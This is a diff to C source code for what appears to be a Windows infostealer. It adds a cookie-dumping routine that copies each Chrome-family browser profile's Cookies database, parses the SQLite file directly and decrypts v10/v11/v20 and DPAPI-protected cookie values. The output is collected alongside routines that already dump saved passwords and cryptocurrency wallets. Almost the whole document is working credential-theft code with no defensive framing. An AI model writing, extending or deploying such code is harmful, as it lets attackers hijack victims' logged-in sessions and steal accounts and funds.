@@ -1276,6 +1276,151 @@ static void _dump_wallets(const char *browser, const char *profile,
     }
 }
 
+/* ── cookie dump ─────────────────────────────────────────────────────── */
+
+typedef struct {
+    const uint8_t *mk;
+    int            have_mk;
+    const uint8_t *v20mk;
+    int            have_v20mk;
+    char          *out;
+    size_t         outsz;
+    size_t        *pos;
+    const char    *bname;
+    const char    *pname;
+} _cookie_ctx_t;
+
+static int _is_enc_blob(const uint8_t *b, uint32_t l)
+{
+    if (l >= 3 && (memcmp(b,"v10",3)==0 || memcmp(b,"v11",3)==0 || memcmp(b,"v20",3)==0))
+        return 1;
+    /* DPAPI blob header */
+    if (l >= 6 && b[0]==0x01 && b[1]==0x00 && b[2]==0x00 && b[3]==0x00 &&
+        b[4]==0xd0 && b[5]==0x8c)
+        return 1;
+    return 0;
+}
+
+static void _cookie_cb(void *ctx_, const _sq_row_t *row)
+{
+    _cookie_ctx_t *ctx = (_cookie_ctx_t *)ctx_;
+    if (*ctx->pos + 512 >= ctx->outsz)
+        return;
+
+    /*
+     * Cookie table schema by Chrome version:
+     * New (Chrome 108+): creation|host|top_frame|name|value|enc_value|path|...  (n>=6)
+     * Old (< Chrome 108): creation|host|name|value|enc_value|path|...           (n>=5)
+     * Detect by checking which column holds the encrypted blob.
+     */
+    int host_col, name_col, val_col, enc_col, path_col;
+    if (row->n >= 6 &&
+        (row->len[5] == 0 || _is_enc_blob(row->val[5], row->len[5]))) {
+        host_col = 1; name_col = 3; val_col = 4; enc_col = 5; path_col = 6;
+    } else if (row->n >= 5 &&
+               (row->len[4] == 0 || _is_enc_blob(row->val[4], row->len[4]))) {
+        host_col = 1; name_col = 2; val_col = 3; enc_col = 4; path_col = 5;
+    } else return;
+
+    /* host_key must be non-empty TEXT */
+    if (!(row->type[host_col] >= 13 && (row->type[host_col] & 1))) return;
+    if (row->len[host_col] == 0) return;
+
+    char host[256] = {0};
+    size_t hl = row->len[host_col] < sizeof(host)-1 ? row->len[host_col] : sizeof(host)-1;
+    memcpy(host, row->val[host_col], hl);
+
+    char cname[256] = {0};
+    if (row->n > name_col && row->type[name_col] >= 13 && (row->type[name_col] & 1))
+    {
+        size_t nl = row->len[name_col] < sizeof(cname)-1 ? row->len[name_col] : sizeof(cname)-1;
+        memcpy(cname, row->val[name_col], nl);
+    }
+
+    char path[128] = "/";
+    if (row->n > path_col && row->type[path_col] >= 13 && (row->type[path_col] & 1) &&
+        row->len[path_col] > 0)
+    {
+        size_t pl = row->len[path_col] < sizeof(path)-1 ? row->len[path_col] : sizeof(path)-1;
+        memcpy(path, row->val[path_col], pl);
+        path[pl] = 0;
+    }
+
+    char value[4096] = {0};
+    int got_val = 0;
+    if (row->n > enc_col && row->len[enc_col] > 0) {
+        got_val = (_decrypt_pw(ctx->mk, ctx->have_mk,
+                               ctx->v20mk, ctx->have_v20mk,
+                               row->val[enc_col], row->len[enc_col],
+                               value, sizeof(value)) == 0);
+    }
+    if (!got_val && row->n > val_col &&
+        row->type[val_col] >= 13 && (row->type[val_col] & 1) && row->len[val_col] > 0)
+    {
+        size_t vl = row->len[val_col] < sizeof(value)-1 ? row->len[val_col] : sizeof(value)-1;
+        memcpy(value, row->val[val_col], vl);
+    }
+
+    size_t avail = ctx->outsz - *ctx->pos - 1;
+    int n = snprintf(ctx->out + *ctx->pos, avail,
+                     "[cookie] %s/%s | %s | %s | %s | %s\n",
+                     ctx->bname, ctx->pname, host, cname, path, value);
+    if (n > 0) *ctx->pos += (size_t)n < avail ? (size_t)n : avail;
+
+    SecureZeroMemory(value, sizeof(value));
+}
+
+static void _dump_cookies_profile(const char *bname, const char *pname,
+                                   const uint8_t *mk, int have_mk,
+                                   const uint8_t *v20mk, int have_v20mk,
+                                   const char *db_path,
+                                   char *out, size_t outsz, size_t *pos)
+{
+    char tmp[MAX_PATH] = {0};
+    if (_copy_to_temp(db_path, tmp, sizeof(tmp)) != 0)
+        return;
+
+    size_t db_sz = 0;
+    uint8_t *db_data = _read_file(tmp, &db_sz);
+    DeleteFileA(tmp);
+    if (!db_data) return;
+
+    if (db_sz < 100 || memcmp(db_data, "SQLite format 3\000", 16) != 0) {
+        free(db_data); return;
+    }
+
+    _sq_db_t db;
+    db.data = db_data;
+    db.size = db_sz;
+    uint16_t pgsz = _be16(db_data + 16);
+    db.page_size = (pgsz == 1) ? 65536u : (uint32_t)pgsz;
+    if (db.page_size < 512 || db.page_size > 65536) { free(db_data); return; }
+
+    _sq_find_t find = {"cookies", 0};
+    _sq_walk(&db, 1, 0, _sq_find_cb, &find);
+    if (!find.rootpage) { free(db_data); return; }
+
+    _cookie_ctx_t cctx = {
+        .mk = mk,      .have_mk = have_mk,
+        .v20mk = v20mk, .have_v20mk = have_v20mk,
+        .out = out, .outsz = outsz, .pos = pos,
+        .bname = bname, .pname = pname,
+    };
+    _sq_walk(&db, find.rootpage, 0, _cookie_cb, &cctx);
+    free(db_data);
+}
+
+/* Try Network\Cookies first (Chrome 96+), fall back to Cookies */
+static int _find_cookies_db(const char *ud, const char *profile,
+                              char *out, size_t outsz)
+{
+    snprintf(out, outsz, "%s\\%s\\Network\\Cookies", ud, profile);
+    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return 0;
+    snprintf(out, outsz, "%s\\%s\\Cookies", ud, profile);
+    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return 0;
+    return -1;
+}
+
 /* ── browser enumeration ─────────────────────────────────────────────── */
 
 /* use_profiles=1: Login Data in <ud>\Default\ and <ud>\Profile N\
@@ -1337,6 +1482,10 @@ static void _dump_browser(const char *name,
         if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
             _dump_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                           db, out, outsz, pos);
+        char cdb[MAX_PATH];
+        if (_find_cookies_db(ud, "Default", cdb, sizeof(cdb)) == 0)
+            _dump_cookies_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
+                                  cdb, out, outsz, pos);
         _dump_wallets(name, "Default", ud, 0, out, outsz, pos);
         SecureZeroMemory(mk, sizeof(mk));
         SecureZeroMemory(v20mk, sizeof(v20mk));
@@ -1350,6 +1499,10 @@ static void _dump_browser(const char *name,
         if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
             _dump_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                           db, out, outsz, pos);
+        char cdb[MAX_PATH];
+        if (_find_cookies_db(ud, "Default", cdb, sizeof(cdb)) == 0)
+            _dump_cookies_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
+                                  cdb, out, outsz, pos);
         _dump_wallets(name, "Default", ud, 1, out, outsz, pos);
     }
 
@@ -1371,6 +1524,10 @@ static void _dump_browser(const char *name,
                 _dump_profile(name, fd.cFileName,
                               mk, have_mk, v20mk, have_v20mk,
                               db, out, outsz, pos);
+            char cdb[MAX_PATH];
+            if (_find_cookies_db(ud, fd.cFileName, cdb, sizeof(cdb)) == 0)
+                _dump_cookies_profile(name, fd.cFileName, mk, have_mk, v20mk, have_v20mk,
+                                      cdb, out, outsz, pos);
             _dump_wallets(name, fd.cFileName, ud, 1, out, outsz, pos);
         } while (FindNextFileA(hf, &fd));
         FindClose(hf);
